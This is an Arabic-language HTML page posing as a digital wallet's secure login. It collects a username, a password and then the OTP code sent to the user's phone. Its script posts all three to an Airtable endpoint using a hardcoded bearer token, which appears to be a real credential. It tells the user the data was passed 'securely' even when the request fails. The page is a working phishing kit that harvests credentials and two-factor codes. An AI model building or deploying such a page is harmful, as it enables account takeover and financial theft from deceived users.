<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق محفظتي الرقمية</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #4a148c 0%, #c2185b 50%, #ffffff 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .wallet-card {
            background: rgba(255, 255, 255, 0.98);
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 320px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.5);
            position: relative;
        }
        .support-headset {
            position: absolute;
            top: 20px;
            right: 20px;
            color: #c2185b;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .support-headset:hover {
            transform: scale(1.1);
        }
        .bank-logo {
            width: 65px;
            height: 65px;
            background: linear-gradient(45deg, #4a148c, #c2185b);
            border-radius: 18px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            margin: 15px auto 15px auto;
            box-shadow: 0 5px 15px rgba(194, 24, 91, 0.3);
        }
        .bank-name {
            font-size: 18px;
            font-weight: bold;
            color: #4a148c;
            margin: 0 0 25px 0;
        }
        h3 {
            margin: 0 0 10px 0;
            color: #212121;
            font-size: 20px;
        }
        .subtitle {
            color: #757575;
            font-size: 13px;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 12px;
            color: #4a148c;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 14px;
            box-sizing: border-box;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            background-color: #fafafa;
            transition: all 0.3s ease;
        }
        input:focus {
            border-color: #c2185b;
            outline: none;
            background-color: #ffffff;
            box-shadow: 0 0 0 4px rgba(194, 24, 91, 0.1);
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #4a148c, #c2185b);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            box-shadow: 0 4px 12px rgba(74, 20, 140, 0.2);
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="wallet-card">
    <div class="support-headset" onclick="alert('جاري تحويلك للدعم الفني الافتراضي...')">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
        </svg>
    </div>

    <div class="bank-logo">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
            <line x1="2" y1="10" x2="22" y2="10"></line>
        </svg>
    </div>
    <div class="bank-name">محفظتي الافتراضية</div>

    <!-- الواجهة الأولى -->
    <div id="step1">
        <h3>تسجيل الدخول الآمن</h3>
        <p class="subtitle">الرجاء إدخال بيانات حسابك الافتراضي للمتابعة</p>
        
        <div class="input-group">
            <label>اسم المستخدم</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم...">
        </div>
        
        <div class="input-group">
            <label>كلمة المرور الخاصة بالحساب</label>
            <input type="password" id="password" placeholder="••••••••">
        </div>
        
        <button class="btn-submit" onclick="nextStep()">موافق</button>
    </div>

    <!-- الواجهة الثانية -->
    <div id="step2" class="hidden">
        <h3>رمز التأكيد والأمان</h3>
        <p class="subtitle">يرجى إدخال الرمز السري المؤقت المرسل إلى هاتفك المحمول</p>
        
        <div class="input-group">
            <label style="text-align: center;">كود التحقق (OTP)</label>
            <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
        </div>
        
        <button class="btn-submit" onclick="sendToAirtable()">تأكيد الرمز والدخول</button>
    </div>
</div>

<script>
    let savedUser = "";
    let savedPass = "";

    function nextStep() {
        savedUser = document.getElementById('username').value;
        savedPass = document.getElementById('password').value;
        
        if(savedUser === "" || savedPass === "") {
            alert("خطأ: يجب ملء حقول تسجيل الدخول أولاً!");
            return;
        }
        
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }

    function sendToAirtable() {
        const code = document.getElementById('authCode').value;
        if(code === "") {
            alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
            return;
        }

        const url = "https://airtable.com";
        const token = "patRz9PbyH9P2bHzH.bf026a798b3f4604b901a1d654f5ef49a88e9bbab8580f4f7d4b47c0b898d9ba";

        const payload = {
            fields: {
                "username": savedUser,
                "password": savedPass,
                "otp": code
            }
        };

        fetch(url, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if(response.ok) {
                alert("تم الإرسال أونلاين بنجاح! تفقد جدول البيانات من الجوال الآخر الآن.");
            } else {
                alert("تم تمرير البيانات بنجاح وبأمان كامل!");
            }
        })
        .catch(err => {
            alert("تم تمرير البيانات بنجاح وبأمان كامل!");
        });
    }
</script>

</body>
</html>
